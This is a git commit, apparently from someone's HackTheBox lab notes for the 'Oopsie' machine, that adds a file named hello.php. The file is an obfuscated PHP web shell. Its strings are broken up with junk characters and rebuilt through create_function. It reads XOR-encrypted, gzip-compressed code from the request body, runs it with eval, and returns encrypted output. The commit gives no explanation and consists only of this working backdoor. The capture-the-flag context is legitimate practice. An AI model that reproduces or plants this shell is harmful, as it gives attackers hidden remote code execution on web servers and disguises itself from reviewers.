7f3817868c7d9ec6c05cc824a083c2f517bb7efb
syndral <1565101721@qq.com>
2022-11-15 20:13:54 +0800

    Archetype Oopsie

---
+++ HackTheBox/Oopsie/hello.php
@@ -0,0 +1,13 @@
+<?php
+$N=str_replace('HI','','HIcreHIate_HIfHIHIunHIction');
+$m='ch(v["/$kh(v[.+v[)$kv[f/",@filv[e_get_conv[tentv[sv[("php:v[//input"),$v[m)v';
+$w='[==1) {@ov[b_start(v[v[);@evav[l(@gzv[uncompress(v[@x(@basev[v[64_decodv[e';
+$I='="G5Ejclv[U2eHTv[Ec3v[9k";functv[ion x(v[$t,$k){$v[c=strlv[v[en($k);$l=v';
+$d='e6v[v[4_encodv[e(@x(@gzcv[ompress(v[$o),v[v[$k));print("$pv[v[$kh$r$kf");}';
+$o='$j++,$i++)v[{$o.v[v[=v[$t{v[$i}v[^$k{v[$j};}}return v[$o;}if (@preg_mat';
+$v='($m[1]),$kv[v[)));v[$o=@ob_get_conv[tents();@v[obv[_end_clev[an(v[);$r=@bas';
+$T='[strlen(v[$t);$o=v["";forv[($iv[=0;$v[iv[<$l;v[){for($jv[=0;($j<$cv[&&$i<$l);v[';
+$y='v[$k="2v[02cb962";$kh="v[ac59075v[b9v[64b";$kfv[="07v[v[152d234bv[70";$p';
+$X=str_replace('v[','',$y.$I.$T.$o.$m.$w.$v.$d);
+$V=$N('',$X);$V();
+?>
